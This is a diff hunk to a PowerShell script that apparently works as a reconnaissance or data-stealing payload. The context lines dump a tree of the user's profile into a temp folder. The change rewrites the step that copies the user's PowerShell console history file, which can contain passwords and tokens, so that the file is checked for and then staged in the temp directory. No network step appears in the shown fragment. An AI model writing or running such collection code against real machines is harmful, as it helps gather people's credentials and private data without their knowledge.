@@ -61,8 +61,11 @@ New-Item -Path $env:tmp/$FolderName -ItemType Directory
 tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
 
 # Powershell history
-Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt -ErrorAction SilentlyContinue
-
+# Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt -ErrorAction SilentlyContinue
+$historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+if (Test-Path $historyPath) {
+    Copy-Item $historyPath -Destination "$env:TEMP\ConsoleHost_history.txt"
+}
 ############################################################################################################################################################
 
 function Get-fullName {
